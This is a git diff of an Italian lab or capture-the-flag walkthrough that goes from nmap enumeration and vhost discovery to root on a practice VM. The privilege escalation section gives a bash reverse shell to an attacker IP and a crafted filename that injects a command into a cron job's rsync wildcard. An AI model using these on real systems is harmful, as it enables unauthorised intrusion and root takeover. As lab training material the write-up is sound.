@@ -1,11 +1,13 @@
 
-prima cosa da fare : 
-- nmap -sP <mio_ip>/24 per trovare l'ip della macchina target
+# Enumerazione
 
-poi nmap su macchina target con :
-- nmap -sn -sC -sV <target_ip>
+Prima cosa da fare : 
+- `nmap -sP <mio_ip>/24` per trovare l'ip della macchina target
 
-ci sono le porte 22,80,443, 8080,8081,8082 aperte, come possiamo vedere dalla seguente immagine
+Poi nmap su macchina target con :
+- `nmap -sn -sC -sV <target_ip>`
+
+Il risultato di nmap sarà il seguente : 
 
 ```shell
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-14 12:01 CEST
@@ -52,6 +54,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.96 seconds
 ```
+## Primo approccio
 
 Navighiamo su http://10.0.2.5 e troviamo la pagina di benvenuto di nginx
 
@@ -117,6 +120,8 @@ lo eseguiamo e otteniamo delle credenziali, ovvero :
 
 Con queste credenziali proviamo ad entrare in ssh, ma non ci fa accedere, quindi dobbiamo fare un ulteriore enumerazione
 
+# Enumerazione parte 2 (vhost)
+
 Avevamo visti dalla scansione nmap che c'era un common name, ovvero `robot.vdsi`. Questo ci suggerisce la presenza di un virtual host.
 
 (Se la scansione non va e da problemi del tipo : `dial tcp:lookup robot.vdsi no such host`, si rimedia cosi : 
@@ -142,6 +147,8 @@ per spawnare una shell funzionante
 
 Ora siamo l'utente blunder, e dobbiamo fare privilege escalation
 
+# Utente blunder
+
 Vediamo che nella cartella backup_container ci sono un crontab e un file chiamato backup.sh, nel file backup.sh vediamo che viene seguito il comando rsync -a * (la presenza di wildcart ci assicura un possibile exploit)
 
 Vedendo online abbiamo trovato che si può fare la wildcard exploitations, e con rsync basta fare questo
@@ -149,5 +156,9 @@ Vedendo online abbiamo trovato che si può fare la wildcard exploitations, e con
 - 1) creiamo un file shell.sh, al cui interno mettiamo la seguente stringa 
 	- `bash -c 'bash -i >& /dev/tcp/<tuo_ip>/<porta> 0>&1'`
 - 2) poi lanciamo il comando `touch -- '-e sh shell.sh'` e attendiamo la connessione
+
+# Privilege Escalation
+
+In teoria qui c'era da fare un ulteriore passaggio, ovvero passare per l'utente Aris, fare docker escape e poi prendere la shell di root, però una volta lanciato lo script shell.sh l'unica shelle che possiamo ottenere è quella di root, quindi bho
 
 Una volta presa la shell con netcat, saremo utente ROOT
